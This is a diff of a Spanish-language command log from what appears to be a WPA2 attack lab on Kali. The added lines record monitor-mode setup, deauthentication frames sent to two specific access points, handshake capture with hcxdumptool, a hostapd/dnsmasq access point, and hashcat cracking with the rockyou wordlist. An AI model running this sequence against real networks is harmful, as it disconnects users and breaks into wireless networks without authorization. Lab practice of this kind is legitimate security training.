@@ -64,3 +64,80 @@
 2025-04-22 22:47:44,931 INFO Ejecutando: sudo hostapd /home/kali/wpa2lab/hostapd/hostapd.conf
 2025-04-22 22:47:52,611 INFO Ejecutando: sudo airmon-ng check kill
 2025-04-22 22:47:52,850 INFO Ejecutando: sudo airmon-ng start wlan0
+2025-04-29 16:20:32,273 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 16:20:32,489 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 16:21:15,416 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 16:21:16,684 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 16:21:16,833 INFO Ejecutando: sudo hostapd /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 16:22:05,984 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 16:22:06,184 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 16:22:11,110 INFO Ejecutando: sudo hcxdumptool -i wlan1mon -w /home/kali/wpa2lab/dump.pcapng
+2025-04-29 16:26:16,247 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 16:26:17,483 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 16:26:17,736 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 16:26:22,444 INFO Ejecutando: sudo aireplay-ng --keep-tries 0 -0 1 -a 80:6d:97:af:e5:ff wlan1mon
+2025-04-29 16:26:30,310 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 16:26:31,584 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 16:26:31,800 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 16:26:33,259 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 16:26:34,540 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 16:26:34,689 INFO Ejecutando: sudo hostapd /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 17:08:20,596 INFO Ejecutando: sudo aireplay-ng -0 1 -a 2C:96:82:D4:03:48 wlan1mon
+2025-04-29 17:11:07,367 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 17:11:08,580 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 17:11:08,600 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 17:11:08,618 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 17:11:08,636 INFO Ejecutando: sudo killall dnsmasq
+2025-04-29 17:11:08,659 INFO Ejecutando: sudo hostapd -B /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 17:11:16,597 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 17:11:16,610 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 17:11:16,625 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 17:11:16,640 INFO Ejecutando: sudo killall dnsmasq
+2025-04-29 17:24:57,505 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 17:24:57,528 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 17:24:57,543 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 17:24:57,559 INFO Ejecutando: sudo killall dnsmasq
+2025-04-29 17:30:04,245 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 17:30:05,061 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 17:30:15,016 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 17:30:16,251 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 17:30:16,398 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 17:30:16,412 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 17:30:16,467 INFO Ejecutando: sudo hostapd -B /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 17:30:17,021 INFO Ejecutando: sudo dnsmasq -C /home/kali/wpa2lab/dnsmasq/dnsmasq.conf
+2025-04-29 17:33:42,251 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 17:33:42,499 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 17:33:51,046 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 17:33:52,311 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 17:33:52,465 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 17:33:52,482 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 17:33:52,538 INFO Ejecutando: sudo hostapd -B /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 17:33:53,005 INFO Ejecutando: sudo dnsmasq -C /home/kali/wpa2lab/dnsmasq/dnsmasq.conf
+2025-04-29 17:35:34,699 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 17:35:34,939 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 17:36:22,349 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 17:36:23,679 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 17:36:23,833 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 17:36:23,851 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 17:36:23,904 INFO Ejecutando: sudo hostapd -B /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 17:36:24,364 INFO Ejecutando: sudo dnsmasq -C /home/kali/wpa2lab/dnsmasq/dnsmasq.conf
+2025-04-29 17:46:13,655 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 17:46:13,671 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 17:46:13,686 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 17:46:13,738 INFO Ejecutando: sudo hostapd -B /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 17:46:16,391 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 17:46:16,616 INFO Ejecutando: sudo airmon-ng start wlan1
+2025-04-29 18:08:54,837 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 18:08:55,710 INFO Ejecutando: sudo airmon-ng start wlan0
+2025-04-29 18:09:00,759 INFO Ejecutando: sudo airmon-ng stop wlan1mon
+2025-04-29 18:11:15,854 INFO Ejecutando: sudo airmon-ng check kill
+2025-04-29 18:11:16,085 INFO Ejecutando: sudo airmon-ng start wlan0
+2025-04-29 18:11:23,411 INFO Ejecutando: sudo ip link set wlan1 up
+2025-04-29 18:11:23,422 INFO Ejecutando: sudo ip addr flush dev wlan1
+2025-04-29 18:11:23,434 INFO Ejecutando: sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-04-29 18:11:23,491 INFO Ejecutando: sudo hostapd -B /home/kali/wpa2lab/hostapd/hostapd.conf
+2025-04-29 18:11:24,046 INFO Ejecutando: sudo dnsmasq -C /home/kali/wpa2lab/dnsmasq/dnsmasq.conf
+2025-04-29 18:11:30,085 INFO Ejecutando: sudo hcxdumptool -i wlan0mon -w /home/kali/wpa2lab/dump.pcapng
+2025-04-29 18:18:15,260 INFO Ejecutando: hcxpcapngtool -o /home/kali/wpa2lab/hash.22000 /home/kali/wpa2lab/dump.pcapng
+2025-04-29 18:18:31,142 INFO Ejecutando: hashcat -m 22000 /home/kali/wpa2lab/hash.22000 /usr/share/wordlists/rockyou.txt
+2025-04-29 18:19:44,072 INFO Ejecutando: hashcat -m 22000 /home/kali/wpa2lab/hash.22000 /usr/share/wordlists/rockyou.txt
